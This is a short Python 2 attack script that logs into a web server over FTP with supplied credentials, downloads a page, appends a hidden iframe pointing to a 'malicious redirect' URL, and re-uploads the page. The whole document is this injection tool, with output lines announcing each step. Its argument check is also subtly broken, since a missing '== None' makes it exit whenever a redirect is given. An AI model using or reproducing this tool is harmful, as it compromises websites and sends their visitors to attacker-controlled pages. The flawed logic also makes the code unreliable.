import ftplib
import optparse
def injectPage(ftp, page, redirect):
	f = open(page + ".tmp", "w")
	ftp.retrlines("RETR " + page, f.write)
	print "[+] Downloaded Page: " + page
	f.write(redirect)
	f.close()
	print "[+] Injected Malicious IFrame on: " + page
	ftp.storlines("STOR " + page, open(page + ".tmp"))
	print "[+] Uploaded Injected Page: " + page
def main():
	parser = optparse.OptionParser("Usage: " + "-H <Target Host> -U <Target User> -P <Target Password> -D <Target Default Page> -R <Malicious Redirect>")
	parser.add_option("-H", dest = "targetHost", type = "string", help = "Specify a Target Host")
	parser.add_option("-U", dest = "targetUser", type = "string", help = "Specify a Target User")
	parser.add_option("-P", dest = "targetPassword", type = "string", help = "Specify a Target Password")
	parser.add_option("-D", dest = "targetDefault", type = "string", help = "Specify a Target Default Page")
	parser.add_option("-R", dest = "targetRedirect", type = "string", help = "Specify a Malicious Redirect")
	(options, args) = parser.parse_args()

	if (options.targetHost == None or options.targetUser == None or options.targetPassword == None or options.targetDefault == None or options.targetRedirect):
		print parser.usage
		exit(0)
	else:
		targetHost = options.targetHost
		targetUser = options.targetUser
		targetPassword = options.targetPassword
		targetDefault = options.targetDefault
		targetRedirect = options.targetRedirect

	ftp = ftplib.FTP(targetHost)
	ftp.login(targetUser, targetPassword)
	redirectIFrame = "<iframe src= " + targetRedirect + "></iframe>"
	injectPage(ftp,targetDefault,redirectIFrame)
if __name__ == "__main__":
	main()
